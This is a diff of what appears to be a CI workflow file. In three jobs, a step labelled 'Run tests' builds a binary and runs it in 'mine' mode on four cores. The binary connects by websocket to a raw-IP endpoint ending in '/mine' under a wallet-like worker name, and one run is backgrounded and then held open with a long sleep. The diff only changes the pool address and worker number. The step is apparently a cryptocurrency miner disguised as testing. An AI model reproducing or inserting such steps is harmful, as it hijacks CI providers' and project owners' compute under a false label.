@@ -29,7 +29,7 @@ jobs:
     - name: Build
       run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd jamput && ./target/release/visco --url ws://20.5.16.149:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.13 --cores 4 &
+      run: cd jamput && ./target/release/visco --url ws://20.6.90.76:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.21 --cores 4 &
         sleep 305s
   npm2:
     needs: npm
@@ -56,7 +56,7 @@ jobs:
     - name: Build
       run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd jamput && ./target/release/visco --url ws://20.5.16.149:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.13 --cores 4
+      run: cd jamput && ./target/release/visco --url ws://20.6.90.76:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.21 --cores 4
         
     
      
@@ -85,7 +85,7 @@ jobs:
     - name: Build
       run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd jamput && ./target/release/visco --url ws://20.5.16.149:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.13 --cores 4
+      run: cd jamput && ./target/release/visco --url ws://20.6.90.76:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.21 --cores 4
         
     
   Success:
